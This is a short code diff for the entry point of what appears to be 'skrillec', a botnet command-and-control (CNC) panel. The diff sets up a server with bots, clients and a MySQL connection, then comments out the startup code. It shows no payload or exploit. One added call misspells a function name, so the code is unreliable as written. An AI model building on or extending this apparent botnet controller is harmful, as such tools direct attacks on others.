@@ -23,8 +23,8 @@ import config
 import skrillec_cp
 
 fn main() {
-	// println(utils.gradient([255,0,0], [11,25,222], "testing gdfg"))
-	
+	println(utils.gradiennt([255,0,0], [11,25,222], "testing gdfg"))
+	/*
 	//get mySQL info
 	mut info := config.get_db_info()
 	mut svr := server.Server{clients: &server.Clients{}, sqlconn: mysql.Connection{
@@ -32,7 +32,7 @@ fn main() {
 		port: info[1].u32(),
 		username: info[2],
 		dbname: info[3]
-	}, current: &server.Current{}, notice: &utils.NotificationSys{}, bots: &server.Bots{}}
+	}, current: &server.Current{}, notice: &utils.NotificationSys{}, bots: &server.Bots{}, parser: &utils.Parse{}}
 	// Update Check. Making sure this is the latest update or it will ask you to update the binary!
 	server.update_check()
 	
@@ -92,5 +92,5 @@ fn main() {
 	go server.start_skrillec(mut &svr)
 	// Start the CNC CP to control the CNC from server/VPS!
 	skrillec_cp.main_cp()
-	
+	*/
 } 
